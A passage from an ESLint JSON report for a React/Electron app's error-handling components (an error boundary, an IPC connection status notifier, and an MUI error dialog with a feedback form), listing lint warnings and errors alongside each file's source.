0.4 }}\n                className=\"text-left bg-muted/50 rounded-lg p-4 mt-4\"\n              >\n                <summary className=\"cursor-pointer font-medium text-sm mb-2 flex items-center gap-2\">\n                  <Bug size={16} />\n                  Error Details (Development)\n                </summary>\n                <pre className=\"text-xs text-destructive overflow-auto max-h-32 whitespace-pre-wrap\">\n                  {error.name}: {error.message}\n                  {'\\n\\n'}\n                  {error.stack}\n                </pre>\n              </motion.details>\n            )}\n\n            {/* Retry info */}\n            {retryCount > 0 && (\n              <motion.p\n                initial={{ opacity: 0 }}\n                animate={{ opacity: 1 }}\n                className=\"text-sm text-muted-foreground\"\n              >\n                Retry attempt: {retryCount}/{MAX_RETRY_COUNT}\n              </motion.p>\n            )}\n          </motion.div>\n\n          <motion.div\n            initial={{ y: 20, opacity: 0 }}\n            animate={{ y: 0, opacity: 1 }}\n            transition={{ delay: 0.3 }}\n            className=\"flex flex-wrap gap-3 mt-8\"\n          >\n            {canRetry && (\n              <motion.button\n                whileHover={{ scale: 1.05 }}\n                whileTap={{ scale: 0.95 }}\n                onClick={this.handleRetry}\n                className=\"inline-flex items-center gap-2 px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors\"\n              >\n                <RefreshCw size={16} />\n                Try Again\n              </motion.button>\n            )}\n\n            {isAppLevel && (\n              <>\n                <motion.button\n                  whileHover={{ scale: 1.05 }}\n                  whileTap={{ scale: 0.95 }}\n                  onClick={this.handleReload}\n                  className=\"inline-flex items-center gap-2 px-4 py-2 bg-secondary text-secondary-foreground rounded-lg hover:bg-secondary/90 transition-colors\"\n                >\n                  <RefreshCw size={16} />\n                  Reload Page\n                </motion.button>\n\n                <motion.button\n                  whileHover={{ scale: 1.05 }}\n                  whileTap={{ scale: 0.95 }}\n                  onClick={this.handleGoHome}\n                  className=\"inline-flex items-center gap-2 px-4 py-2 bg-muted text-muted-foreground rounded-lg hover:bg-muted/90 transition-colors\"\n                >\n                  <Home size={16} />\n                  Go Home\n                </motion.button>\n              </>\n            )}\n          </motion.div>\n        </motion.div>\n      );\n    }\n\n    return this.props.children;\n  }\n}\n\n// Convenience wrapper for functional components\nexport const withErrorBoundary = <P extends object>(\n  Component: React.ComponentType<P>,\n  errorBoundaryProps?: Omit<Props, 'children'>\n) => {\n  const WrappedComponent = (props: P) => (\n    <ErrorBoundary {...errorBoundaryProps}>\n      <Component {...props} />\n    </ErrorBoundary>\n  );\n\n  WrappedComponent.displayName = `withErrorBoundary(${Component.displayName || Component.name})`;\n  \n  return WrappedComponent;\n};","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/IPCStatusNotification.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Settings' is defined but never used.","line":19,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":19,"endColumn":11},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Info' is defined but never used.","line":20,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":20,"endColumn":7},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Clock' is defined but never used.","line":21,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":21,"endColumn":8},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has missing dependencies: 'addNotification', 'lastStatus.isAvailable', and 'lastStatus.isHealthy'. Either include them or remove the dependency array.","line":276,"column":6,"nodeType":"ArrayExpression","endLine":276,"endColumn":38,"suggestions":[{"desc":"Update the dependencies array to be: [addNotification, ipc.isAvailable, ipc.isHealthy, lastStatus.isAvailable, lastStatus.isHealthy]","fix":{"range":[8042,8074],"text":"[addNotification, ipc.isAvailable, ipc.isHealthy, lastStatus.isAvailable, lastStatus.isHealthy]"}}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'addNotification'. Either include it or remove the dependency array.","line":290,"column":6,"nodeType":"ArrayExpression","endLine":290,"endColumn":43,"suggestions":[{"desc":"Update the dependencies array to be: [ipc.lastError, ipc.connectionErrors, addNotification]","fix":{"range":[8385,8422],"text":"[ipc.lastError, ipc.connectionErrors, addNotification]"}}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":296,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":296,"endColumn":20,"suggestions":[{"fix":{"range":[8533,8589],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":6,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Global IPC Status Notification Component (2025)\n * \n * This component provides application-wide notifications for IPC connectivity\n * issues, error status, and recovery actions.\n * \n * Following 2025 React patterns for global notifications and status indicators.\n */\n\nimport React, { useState, useEffect } from 'react';\nimport { motion, AnimatePresence } from 'framer-motion';\nimport { \n  Wifi, \n  WifiOff, \n  AlertTriangle, \n  CheckCircle, \n  RefreshCw, \n  X, \n  Settings,\n  Info,\n  Clock\n} from 'lucide-react';\nimport { useIPC } from '@/contexts/IPCContext';\n\n// Notification types\ntype NotificationType = 'info' | 'warning' | 'error' | 'success';\n\ninterface NotificationConfig {\n  type: NotificationType;\n  icon: React.ComponentType<{ className?: string }>;\n  title: string;\n  message: string;\n  showRetry?: boolean;\n  showDismiss?: boolean;\n  autoHide?: boolean;\n  autoHideDelay?: number;\n}\n\n// Notification state\ninterface NotificationState extends NotificationConfig {\n  id: string;\n  timestamp: Date;\n}\n\n/**\n * Single notification item component\n */\nfunction NotificationItem({\n  notification,\n  onRetry,\n  onDismiss\n}: {\n  notification: NotificationState;\n  onRetry: () => void;\n  onDismiss: (id: string) => void;\n}) {\n  const { type, icon: Icon, title, message, showRetry, showDismiss, id } = notification;\n  \n  const typeStyles = {\n    info: 'bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800 text-blue-800 dark:text-blue-200',\n    warning: 'bg-yellow-50 dark:bg-yellow-900/20 border-yellow-200 dark:border-yellow-800 text-yellow-800 dark:text-yellow-200',\n    error: 'bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800 text-red-800 dark:text-red-200',\n    success: 'bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800 text-green-800 dark:text-green-200'\n  };\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, y: -20, scale: 0.95 }}\n      animate={{ opacity: 1, y: 0, scale: 1 }}\n      exit={{ opacity: 0, y: -20, scale: 0.95 }}\n      transition={{ duration: 0.3 }}\n      className={`border rounded-lg p-4 shadow-lg backdrop-blur-sm ${typeStyles[type]}`}\n    >\n      <div className=\"flex items-start gap-3\">\n        <Icon className=\"w-5 h-5 mt-0.5 flex-shrink-0\" />\n        \n        <div className=\"flex-1 min-w-0\">\n          <p className=\"font-medium text-sm\">{title}</p>\n          <p className=\"text-sm mt-1 opacity-90\">{message}</p>\n          \n          <div className=\"flex items-center gap-3 mt-3\">\n            {showRetry && (\n              <motion.button\n                whileHover={{ scale: 1.05 }}\n                whileTap={{ scale: 0.95 }}\n                onClick={onRetry}\n                className=\"text-xs font-medium underline hover:no-underline opacity-80 hover:opacity-100\"\n              >\n                Try Again\n              </motion.button>\n            )}\n            \n            <span className=\"text-xs opacity-60\">\n              {notification.timestamp.toLocaleTimeString()}\n            </span>\n          </div>\n        </div>\n\n        {showDismiss && (\n          <motion.button\n            whileHover={{ scale: 1.1 }}\n            whileTap={{ scale: 0.9 }}\n            onClick={() => onDismiss(id)}\n            className=\"opacity-60 hover:opacity-100 transition-opacity\"\n          >\n            <X className=\"w-4 h-4\" />\n          </motion.button>\n        )}\n      </div>\n    </motion.div>\n  );\n}\n\n/**\n * Compact status indicator for the app header/toolbar\n */\nfunction CompactStatusIndicator({\n  isAvailable,\n  isHealthy,\n  connectionErrors,\n  onToggleDetails\n}: {\n  isAvailable: boolean;\n  isHealthy: boolean;\n  connectionErrors: number;\n  onToggleDetails: () => void;\n}) {\n  const getStatus = () => {\n    if (!isAvailable) {\n      return {\n        icon: WifiOff,\n        color: 'text-red-500',\n        status: 'Offline'\n      };\n    }\n    \n    if (!isHealthy || connectionErrors > 0) {\n      return {\n        icon: AlertTriangle,\n        color: 'text-yellow-500',\n        status: 'Issues'\n      };\n    }\n    \n    return {\n      icon: Wifi,\n      color: 'text-green-500',\n      status: 'Online'\n    };\n  };\n\n  const { icon: Icon, color, status } = getStatus();\n\n  return (\n    <motion.button\n      whileHover={{ scale: 1.05 }}\n      whileTap={{ scale: 0.95 }}\n      onClick={onToggleDetails}\n      className=\"flex items-center gap-2 px-2 py-1 rounded text-xs transition-colors hover:bg-accent/50\"\n      title={`IPC Status: ${status}${connectionErrors > 0 ? ` (${connectionErrors} errors)` : ''}`}\n    >\n      <Icon className={`w-3 h-3 ${color}`} />\n      <span className=\"hidden sm:inline text-muted-foreground\">{status}</span>\n      {connectionErrors > 0 && (\n        <span className=\"bg-red-500 text-white text-xs rounded-full px-1 min-w-[16px] text-center\">\n          {connectionErrors > 9 ? '9+' : connectionErrors}\n        </span>\n      )}\n    </motion.button>\n  );\n}\n\n/**\n * Main IPC Status Notification component\n */\nexport function IPCStatusNotification({\n  position = 'top-right',\n  showCompactIndicator = true,\n  autoHideSuccess = true,\n  maxNotifications = 3\n}: {\n  position?: 'top-left' | 'top-right' | 'bottom-left' | 'bottom-right';\n  showCompactIndicator?: boolean;\n  autoHideSuccess?: boolean;\n  maxNotifications?: number;\n}) {\n  const ipc = useIPC();\n  const [notifications, setNotifications] = useState<NotificationState[]>([]);\n  const [showDetails, setShowDetails] = useState(false);\n  const [lastStatus, setLastStatus] = useState({ isAvailable: false, isHealthy: false });\n\n  // Create notification\n  const addNotification = (config: NotificationConfig) => {\n    const notification: NotificationState = {\n      ...config,\n      id: `${Date.now()}_${Math.random().toString(36).substring(2)}`,\n      timestamp: new Date()\n    };\n\n    setNotifications(prev => {\n      const newNotifications = [notification, ...prev];\n      return newNotifications.slice(0, maxNotifications);\n    });\n\n    // Auto-hide if configured\n    if (config.autoHide !== false) {\n      const delay = config.autoHideDelay || (config.type === 'success' && autoHideSuccess ? 3000 : 0);\n      if (delay > 0) {\n        setTimeout(() => {\n          removeNotification(notification.id);\n        }, delay);\n      }\n    }\n  };\n\n  // Remove notification\n  const removeNotification = (id: string) => {\n    setNotifications(prev => prev.filter(n => n.id !== id));\n  };\n\n  // Handle IPC status changes\n  useEffect(() => {\n    const currentStatus = { isAvailable: ipc.isAvailable, isHealthy: ipc.isHealthy };\n    \n    // Connection lost\n    if (lastStatus.isAvailable && !currentStatus.isAvailable) {\n      addNotification({\n        type: 'error',\n        icon: WifiOff,\n        title: 'Connection Lost',\n        message: 'Lost connection to the desktop application. Some features may be unavailable.',\n        showRetry: true,\n        showDismiss: true\n      });\n    }\n    \n    // Connection restored\n    else if (!lastStatus.isAvailable && currentStatus.isAvailable) {\n      addNotification({\n        type: 'success',\n        icon: CheckCircle,\n        title: 'Connection Restored',\n        message: 'Successfully reconnected to the desktop application.',\n        showDismiss: true,\n        autoHide: true,\n        autoHideDelay: 3000\n      });\n    }\n    \n    // Health issues\n    else if (currentStatus.isAvailable && lastStatus.isHealthy && !currentStatus.isHealthy) {\n      addNotification({\n        type: 'warning',\n        icon: AlertTriangle,\n        title: 'Connection Issues',\n        message: 'The desktop application is experiencing connection problems.',\n        showRetry: true,\n        showDismiss: true\n      });\n    }\n    \n    // Health restored\n    else if (currentStatus.isAvailable && !lastStatus.isHealthy && currentStatus.isHealthy) {\n      addNotification({\n        type: 'success',\n        icon: CheckCircle,\n        title: 'Connection Healthy',\n        message: 'Connection issues have been resolved.',\n        showDismiss: true,\n        autoHide: true,\n        autoHideDelay: 2000\n      });\n    }\n\n    setLastStatus(currentStatus);\n  }, [ipc.isAvailable, ipc.isHealthy]);\n\n  // Handle error changes\n  useEffect(() => {\n    if (ipc.lastError && ipc.connectionErrors > 0) {\n      addNotification({\n        type: 'error',\n        icon: AlertTriangle,\n        title: 'IPC Error',\n        message: ipc.lastError,\n        showRetry: true,\n        showDismiss: true\n      });\n    }\n  }, [ipc.lastError, ipc.connectionErrors]);\n\n  const handleRetry = async () => {\n    try {\n      await ipc.refreshStatus();\n    } catch (error) {\n      console.error('Failed to retry IPC connection:', error);\n    }\n  };\n\n  const positionClasses = {\n    'top-left': 'top-4 left-4',\n    'top-right': 'top-4 right-4',\n    'bottom-left': 'bottom-4 left-4',\n    'bottom-right': 'bottom-4 right-4'\n  };\n\n  return (\n    <>\n      {/* Compact indicator */}\n      {showCompactIndicator && (\n        <CompactStatusIndicator\n          isAvailable={ipc.isAvailable}\n          isHealthy={ipc.isHealthy}\n          connectionErrors={ipc.connectionErrors}\n          onToggleDetails={() => setShowDetails(!showDetails)}\n        />\n      )}\n\n      {/* Notification panel */}\n      <div className={`fixed ${positionClasses[position]} z-50 w-80 max-w-[calc(100vw-2rem)]`}>\n        <AnimatePresence>\n          {notifications.map((notification) => (\n            <div key={notification.id} className=\"mb-3\">\n              <NotificationItem\n                notification={notification}\n                onRetry={handleRetry}\n                onDismiss={removeNotification}\n              />\n            </div>\n          ))}\n        </AnimatePresence>\n\n        {/* Details panel */}\n        <AnimatePresence>\n          {showDetails && (\n            <motion.div\n              initial={{ opacity: 0, y: -10 }}\n              animate={{ opacity: 1, y: 0 }}\n              exit={{ opacity: 0, y: -10 }}\n              className=\"mt-3 bg-card border rounded-lg p-4 shadow-lg backdrop-blur-sm\"\n            >\n              <div className=\"flex items-center justify-between mb-3\">\n                <h3 className=\"font-semibold text-sm\">IPC Status Details</h3>\n                <button\n                  onClick={() => setShowDetails(false)}\n                  className=\"text-muted-foreground hover:text-foreground\"\n                >\n                  <X className=\"w-4 h-4\" />\n                </button>\n              </div>\n\n              <div className=\"space-y-2 text-xs\">\n                <div className=\"flex justify-between\">\n                  <span>Available:</span>\n                  <span className={ipc.isAvailable ? 'text-green-600' : 'text-red-600'}>\n                    {ipc.isAvailable ? 'Yes' : 'No'}\n                  </span>\n                </div>\n                <div className=\"flex justify-between\">\n                  <span>Healthy:</span>\n                  <span className={ipc.isHealthy ? 'text-green-600' : 'text-red-600'}>\n                    {ipc.isHealthy ? 'Yes' : 'No'}\n                  </span>\n                </div>\n                <div className=\"flex justify-between\">\n                  <span>Error Count:</span>\n                  <span className={ipc.errorCount > 0 ? 'text-yellow-600' : 'text-green-600'}>\n                    {ipc.errorCount}\n                  </span>\n                </div>\n                <div className=\"flex justify-between\">\n                  <span>Methods:</span>\n                  <span className=\"text-muted-foreground\">\n                    {ipc.availableMethods.length}\n                  </span>\n                </div>\n                {ipc.lastHealthCheck && (\n                  <div className=\"flex justify-between\">\n                    <span>Last Check:</span>\n                    <span className=\"text-muted-foreground\">\n                      {ipc.lastHealthCheck.toLocaleTimeString()}\n                    </span>\n                  </div>\n                )}\n              </div>\n\n              <div className=\"flex gap-2 mt-4\">\n                <motion.button\n                  whileHover={{ scale: 1.05 }}\n                  whileTap={{ scale: 0.95 }}\n                  onClick={handleRetry}\n                  className=\"flex items-center gap-1 px-2 py-1 bg-primary text-primary-foreground rounded text-xs hover:bg-primary/90\"\n                >\n                  <RefreshCw className=\"w-3 h-3\" />\n                  Refresh\n                </motion.button>\n                \n                <motion.button\n                  whileHover={{ scale: 1.05 }}\n                  whileTap={{ scale: 0.95 }}\n                  onClick={ipc.clearErrors}\n                  className=\"flex items-center gap-1 px-2 py-1 bg-secondary text-secondary-foreground rounded text-xs hover:bg-secondary/90\"\n                >\n                  Clear Errors\n                </motion.button>\n              </div>\n            </motion.div>\n          )}\n        </AnimatePresence>\n      </div>\n    </>\n  );\n}\n\nexport default IPCStatusNotification;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/MUIErrorBoundary.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'HomeIcon' is defined but never used.","line":51,"column":11,"nodeType":null,"messageId":"unusedVar","endLine":51,"endColumn":19},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'RestoreIcon' is defined but never used.","line":56,"column":14,"nodeType":null,"messageId":"unusedVar","endLine":56,"endColumn":25},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_MUIErrorDialog: React.FC<MUIErrorDialogProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":128,"column":41,"nodeType":"Identifier","endLine":128,"endColumn":49},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_MUIErrorDialog: React.FC<MUIErrorDialogProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":129,"column":51,"nodeType":"Identifier","endLine":129,"endColumn":59},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_MUIErrorDialog: React.FC<MUIErrorDialogProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":130,"column":43,"nodeType":"Identifier","endLine":130,"endColumn":51},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":333,"column":51,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":333,"endColumn":54,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10162,10165],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10162,10165],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":447,"column":39,"nodeType":"Identifier","endLine":447,"endColumn":47},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":448,"column":43,"nodeType":"Identifier","endLine":448,"endColumn":51},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":454,"column":23,"nodeType":"Identifier","endLine":454,"endColumn":34},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":459,"column":29,"nodeType":"Identifier","endLine":459,"endColumn":40},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":490,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":490,"endColumn":20,"suggestions":[{"fix":{"range":[14670,14725],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":499,"column":32,"nodeType":"Identifier","endLine":499,"endColumn":43},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":531,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":531,"endColumn":20,"suggestions":[{"fix":{"range":[15806,15863],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":540,"column":35,"nodeType":"Identifier","endLine":540,"endColumn":46},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useEffect\" is called in function \"_MUIErrorFallback: React.FC<ErrorFallbackProps & MUIErrorBoundaryProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":545,"column":3,"nodeType":"Identifier","endLine":545,"endColumn":12},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":670,"column":14,"nodeType":"Identifier","messageId":"namedExport","endLine":670,"endColumn":32},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":676,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":676,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20087,20090],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20087,20090],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":688,"column":14,"nodeType":"Identifier","messageId":"namedExport","endLine":688,"endColumn":34}],"suppressedMessages":[],"errorCount":10,"fatalErrorCount":0,"warningCount":8,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * MUI Error Boundary Component (2025)\n * \n * Advanced error boundary with Material-UI integration for enhanced user feedback.\n * Combines react-error-boundary patterns with MUI components for professional\n * error handling and user interaction.\n * \n * Features:\n * - MUI Dialog for critical error interaction\n * - MUI Snackbar with Alert for non-intrusive notifications\n * - User feedback collection with MUI forms\n * - Session preservation and state recovery\n * - Integration with ErrorReportingService\n * - Accessibility-compliant error handling\n */\n\nimport React, { ErrorInfo, useState, useCallback, useEffect } from 'react';\nimport { ErrorBoundary as ReactErrorBoundary, useErrorBoundary } from 'react-error-boundary';\nimport {\n  Dialog,\n  DialogTitle,\n  DialogContent,\n  DialogActions,\n  DialogContentText,\n  Button,\n  Snackbar,\n  Alert,\n  AlertTitle,\n  TextField,\n  FormControl,\n  FormLabel,\n  RadioGroup,\n  FormControlLabel,\n  Radio,\n  Box,\n  Typography,\n  Divider,\n  Chip,\n  IconButton,\n  Collapse,\n  Stack,\n  LinearProgress,\n  Card,\n  CardContent,\n  CardActions\n} from '@mui/material';\nimport {\n  Close as CloseIcon,\n  BugReport as BugReportIcon,\n  Refresh as RefreshIcon,\n  Home as HomeIcon,\n  Download as DownloadIcon,\n  ExpandMore as ExpandMoreIcon,\n  ExpandLess as ExpandLessIcon,\n  Feedback as FeedbackIcon,\n  Restore as RestoreIcon,\n  Emergency as EmergencyIcon\n} from '@mui/icons-material';\nimport { motion } from 'framer-motion';\nimport { errorReportingService, ErrorContext, UserFeedback } from '../../services/ErrorReportingService';\nimport { EnhancedErrorBoundaryProps, ErrorFallbackProps } from './EnhancedErrorBoundary';\n\n// MUI-specific error boundary props\nexport interface MUIErrorBoundaryProps extends Omit<EnhancedErrorBoundaryProps, 'FallbackComponent'> {\n  showDialog?: boolean;\n  showSnackbar?: boolean;\n  dialogTitle?: string;\n  allowUserFeedback?: boolean;\n  allowErrorDownload?: boolean;\n  muiTheme?: 'light' | 'dark' | 'auto';\n  severity?: 'error' | 'warning' | 'info';\n  autoHideDuration?: number;\n  maxWidth?: 'xs' | 'sm' | 'md' | 'lg' | 'xl';\n  enableDetailedReporting?: boolean;\n}\n\n// User feedback form data\ninterface FeedbackFormData {\n  userEmail: string;\n  description: string;\n  steps: string;\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  category: 'bug' | 'feature' | 'improvement' | 'question';\n}\n\n// Error notification state\ninterface ErrorNotificationState {\n  open: boolean;\n  message: string;\n  severity: 'error' | 'warning' | 'info' | 'success';\n  reportId?: string;\n}\n\n/**\n * MUI Error Dialog Component\n */\ninterface MUIErrorDialogProps {\n  open: boolean;\n  error: Error;\n  errorInfo?: ErrorInfo;\n  onClose: () => void;\n  onRetry: () => void;\n  onReportError: (feedback?: FeedbackFormData) => void;\n  onDownloadReport: () => void;\n  retryCount?: number;\n  maxRetries?: number;\n  allowUserFeedback?: boolean;\n  allowErrorDownload?: boolean;\n  maxWidth?: 'xs' | 'sm' | 'md' | 'lg' | 'xl';\n  enableDetailedReporting?: boolean;\n}\n\nconst _MUIErrorDialog: React.FC<MUIErrorDialogProps> = ({\n  open,\n  error,\n  errorInfo,\n  onClose,\n  onRetry,\n  onReportError,\n  onDownloadReport,\n  retryCount = 0,\n  maxRetries = 3,\n  allowUserFeedback = true,\n  allowErrorDownload = true,\n  maxWidth = 'md',\n  enableDetailedReporting = true\n}) => {\n  const [showDetails, setShowDetails] = useState(false);\n  const [showFeedbackForm, setShowFeedbackForm] = useState(false);\n  const [feedbackData, setFeedbackData] = useState<FeedbackFormData>({\n    userEmail: '',\n    description: '',\n    steps: '',\n    severity: 'medium',\n    category: 'bug'\n  });\n\n  const canRetry = retryCount < maxRetries;\n\n  const handleFeedbackSubmit = () => {\n    onReportError(feedbackData);\n    setShowFeedbackForm(false);\n    onClose();\n  };\n\n  const handleQuickReport = () => {\n    onReportError();\n    onClose();\n  };\n\n  return (\n    <Dialog\n      open={open}\n      onClose={onClose}\n      maxWidth={maxWidth}\n      fullWidth\n      aria-labelledby=\"error-dialog-title\"\n      aria-describedby=\"error-dialog-description\"\n    >\n      <DialogTitle \n        id=\"error-dialog-title\"\n        sx={{ \n          display: 'flex', \n          alignItems: 'center', \n          gap: 1,\n          pr: 1\n        }}\n      >\n        <EmergencyIcon color=\"error\" />\n        An Error Occurred\n        <Box sx={{ flexGrow: 1 }} />\n        <IconButton\n          aria-label=\"close\"\n          onClick={onClose}\n          sx={{ color: 'grey.500' }}\n        >\n          <CloseIcon />\n        </IconButton>\n      </DialogTitle>\n\n      <DialogContent>\n        <DialogContentText id=\"error-dialog-description\" sx={{ mb: 2 }}>\n          We're sorry, but something went wrong. Our team has been notified, \n          but you can help us fix this faster by providing additional details.\n        </DialogContentText>\n\n        {/* Error Summary */}\n        <Card variant=\"outlined\" sx={{ mb: 2, bgcolor: 'error.main', color: 'error.contrastText' }}>\n          <CardContent sx={{ py: 1.5 }}>\n            <Typography variant=\"subtitle2\" gutterBottom>\n              Error: {error.name}\n            </Typography>\n            <Typography variant=\"body2\" sx={{ opacity: 0.9 }}>\n              {error.message}\n            </Typography>\n          </CardContent>\n        </Card>\n\n        {/* Retry Information */}\n        {retryCount > 0 && (\n          <Box sx={{ mb: 2 }}>\n            <Typography variant=\"body2\" color=\"text.secondary\">\n              Recovery attempt: {retryCount}/{maxRetries}\n            </Typography>\n            <LinearProgress \n              variant=\"determinate\" \n              value={(retryCount / maxRetries) * 100} \n              sx={{ mt: 1 }}\n            />\n          </Box>\n        )}\n\n        {/* Action Chips */}\n        <Box sx={{ mb: 2 }}>\n          <Stack direction=\"row\" spacing={1} flexWrap=\"wrap\">\n            <Chip\n              icon={<BugReportIcon />}\n              label=\"Report Issue\"\n              color=\"primary\"\n              clickable\n              onClick={() => setShowFeedbackForm(true)}\n              disabled={!allowUserFeedback}\n            />\n            {allowErrorDownload && (\n              <Chip\n                icon={<DownloadIcon />}\n                label=\"Download Report\"\n                variant=\"outlined\"\n                clickable\n                onClick={onDownloadReport}\n              />\n            )}\n            {enableDetailedReporting && (\n              <Chip\n                icon={showDetails ? <ExpandLessIcon /> : <ExpandMoreIcon />}\n                label={showDetails ? \"Hide Details\" : \"Show Details\"}\n                variant=\"outlined\"\n                clickable\n                onClick={() => setShowDetails(!showDetails)}\n              />\n            )}\n          </Stack>\n        </Box>\n\n        {/* Error Details (Collapsible) */}\n        <Collapse in={showDetails}>\n          <Card variant=\"outlined\" sx={{ mb: 2, bgcolor: 'grey.50' }}>\n            <CardContent>\n              <Typography variant=\"subtitle2\" gutterBottom>\n                Technical Details\n              </Typography>\n              <Divider sx={{ mb: 1 }} />\n              <Typography variant=\"body2\" component=\"pre\" sx={{ \n                whiteSpace: 'pre-wrap',\n                fontSize: '0.75rem',\n                maxHeight: 200,\n                overflow: 'auto',\n                fontFamily: 'monospace'\n              }}>\n                {error.stack}\n              </Typography>\n              {errorInfo?.componentStack && (\n                <>\n                  <Divider sx={{ my: 1 }} />\n                  <Typography variant=\"subtitle2\" gutterBottom>\n                    Component Stack\n                  </Typography>\n                  <Typography variant=\"body2\" component=\"pre\" sx={{ \n                    whiteSpace: 'pre-wrap',\n                    fontSize: '0.75rem',\n                    maxHeight: 100,\n                    overflow: 'auto',\n                    fontFamily: 'monospace'\n                  }}>\n                    {errorInfo.componentStack}\n                  </Typography>\n                </>\n              )}\n            </CardContent>\n          </Card>\n        </Collapse>\n\n        {/* User Feedback Form */}\n        <Collapse in={showFeedbackForm}>\n          <Card variant=\"outlined\" sx={{ p: 2, mb: 2 }}>\n            <Typography variant=\"h6\" gutterBottom>\n              Help Us Fix This Issue\n            </Typography>\n            \n            <Stack spacing={2}>\n              <TextField\n                label=\"Your Email (Optional)\"\n                variant=\"outlined\"\n                size=\"small\"\n                fullWidth\n                value={feedbackData.userEmail}\n                onChange={(e) => setFeedbackData(prev => ({ ...prev, userEmail: e.target.value }))}\n                placeholder=\"your.email@example.com\"\n              />\n              \n              <TextField\n                label=\"What were you 